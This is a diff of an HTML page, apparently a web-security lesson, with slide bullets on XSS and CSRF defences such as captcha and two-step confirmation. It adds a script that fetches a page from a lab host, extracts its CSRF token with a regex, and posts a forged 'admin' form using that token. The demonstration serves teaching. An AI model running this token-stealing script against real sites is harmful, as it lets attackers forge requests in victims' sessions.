@@ -1,3 +1,37 @@
-<div class="container">
-    <h1>code53</h1>
+<div class="row">
+    <div class="col-md-6">
+        <div class="list-group">
+            <div class="list-group-item">What if your site is vulnerable to XSS?</div>
+            <div class="list-group-item">Assumption: You can't prevent it</div>
+            <div class="list-group-item">Is it possible to prevent CSRF now?</div>
+            <div class="list-group-item">
+                <ul>
+                    <li>Capcha</li>
+                    <li>Two Level Confirmation</li>
+                </ul>
+            </div>
+        </div>
+    </div>
 </div>
+
+<script>
+    // request the page containing XRF token
+    const level1 = new XMLHttpRequest();
+    level1.open('GET', 'http://sc.io/chapter7?code=52');
+    level1.addEventListener('load', e => {
+        let content = level1.responseText;
+        let match = /name\s*="csrf-token"\s*value\s*="([^"]+)"/.exec(content);
+        if (!match) return;
+        console.log(`Obtained XRF token: "${match[1]}"`);
+        const form = new FormData();
+        form.append('username', 'admin');
+        form.append('csrf-token', match[1]);
+        const level2 = new XMLHttpRequest();
+        level2.open('POST', 'http://sc.io/chapter7?code=52', true);
+        level2.addEventListener('load', e => {
+            console.log(level2.responseText);
+        });
+        level2.send(form);
+    });
+    level1.send();
+</script>
